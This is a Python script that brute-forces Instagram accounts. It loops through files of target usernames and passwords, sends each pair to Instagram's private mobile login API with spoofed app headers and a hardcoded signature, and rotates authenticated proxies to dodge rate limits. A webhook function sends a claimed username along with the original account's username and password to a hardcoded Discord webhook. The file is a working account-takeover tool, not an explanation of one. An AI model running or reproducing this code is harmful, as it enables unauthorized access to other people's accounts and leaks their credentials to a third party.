from concurrent.futures import thread
import email
import sys
from threading import Thread
import threading
from tkinter import E
from traceback import print_list
import requests
from bs4 import BeautifulSoup
import uuid
from colorama import Fore, init
import time
import json
import os
import random
import string

def clear():
    os.system('cls')

clear()

proxy_list = []

with open('data/proxy.txt') as q:
    proxy = q.readlines()

o = 1
for line in proxy:
    e = 0

    prxy = line.split(':')
    proxy1 = prxy[0]
    port1 = prxy[1]
    username1 = prxy[2]
    password1 = prxy[3]
    password1 = password1.strip('\n')

    Proxys = 'http://' + username1 + ':' + password1 + '@' + proxy1 + ':' + port1
    proxy_list.append(Proxys)
    o += 1


versionV = "14.1 beta"
def webhook(attempts, target, userLogin, passLogin):
    paramsGet = {"wait":"true"}
    rawBody = "{\"content\":\"@everyone\",\"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Username claimed**\",\"value\":\"@/" + target + "\"},{\"name\":\"**Attempts**\",\"value\":\"" + str(attempts) +"\"},{\"name\":\"**Original freshie username**\",\"value\":\"@/||" + userLogin + "||\"},{\"name\":\"**Original freshie password**\",\"value\":\"||" + passLogin + "||\"}],\"author\":{\"name\":\"Ni Success\",\"icon_url\":\"https://repository-images.githubusercontent.com/249859975/6d137780-7ad0-11ea-8789-89475d08dfc6\"},\"footer\":{\"text\":\"Claimer v" + versionV +" | Production By SJ\",\"icon_url\":\"https://repository-images.githubusercontent.com/249859975/6d137780-7ad0-11ea-8789-89475d08dfc6\"}}],\"attachments\":[]}"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
        "Content-Type":"application/json"
    }
    webhookRequest = requests.post("https://discord.com/api/webhooks/1010322759282343976/iCBet-S1hFbj7OY5n4LEmCz1_rLzKIMc4xhjtmyJzF0APO9927p9amWU5-E61rYNFO7a", data=rawBody, params=paramsGet, headers=headers)

with open ('data/users.txt') as p:
    targets_list = p.read().split('\n')

k = 0

def post(targ, passLogin, Proxy):
    myUUID = str(uuid.uuid4())
    x = 0

    proxies = {
        'https': Proxy
    }

    global attemptCounter

    paramsPost = {
        "ig_sig_key_version": "5",
        "signed_body": "fa61f4be32e827c7152e38a075e36142d8313ba582d6437f07539b00a03f454e.{\"reg_login\":\"0\",\"password\":\"" + passLogin + "\",\"device_id\":\"" + myUUID + "\",\"username\":\"" + targ + "\",\"adid\":\"FE4FD084-9DCB-481A-A248-57E0E32E25ED\",\"login_attempt_count\":\"0\",\"phone_id\":\"" + myUUID + "\"}"
        }

    headers = {
        "Accept": "*/*", "X-IG-Capabilities": "36r/Vw==",
        "User-Agent": "Instagram 44.0.0.17.95 (iPhone9,3; iOS 12_0; en_US; en-US; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+",
        "Connection": "close", "X-IG-ABR-Connection-Speed-KBPS": "0", "X-IG-Connection-Speed": "-1kbps",
        "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US;q=1", "X-IG-Connection-Type": "WiFi",
        "X-IG-App-ID": "124024574287414", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
    # Login request
    try:
        response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, proxies=proxies, timeout=5)
        lib = response.content.decode('utf-8')

        if("logged_in_user" in lib):
            print("[" + Fore.GREEN + "+" + Fore.RESET + "] Bruted This MF's Shit!")
        elif("The password you entered is incorrect." in lib):
            print(f'[!] Bruting: {targ}')
            print(f'[!] Password: {passLogin} == Incorrect!')
        else:
            print('Error Logging In Account {@' + targ + '} == ' + str(response.status_code))
            print('Reason == ' + str(response.text) + '\n' + 'Pass == ' + passLogin)
    except Exception as e:
        print(e)
        pass

with open('data/pass.txt') as f:
    passwords = f.read().split('\n')

len = passwords.__len__()

nWorkers = input('Number of threads: ')

clear()

print('Starting Bruter By SJ (SJ#0008)')
print('No one ever wants to listen, fuck all of these fucking comedians.\n\n')

threads = []

attemptCounter = 0
i = 0
a = 0
r = 0
for passW in passwords:
    for user in targets_list:
        try:

            session = requests.Session()

            post(user, passW, proxy_list[r])
            os.system('title [SJ] R/s: ' + str(attemptCounter) + " // Account #" + str(a))
            a += 1
            r += 1
            attemptCounter += 1
        except Exception as S:
            print(S)
            continue
    i+=1
    

"""for n in range(int(nWorkers)):
    t = threading.Thread(target=post, args=(user, passwords[i], proxy_list[r]))
    threads.append(t)
    t.start()
for process in threads:
    process.join()"""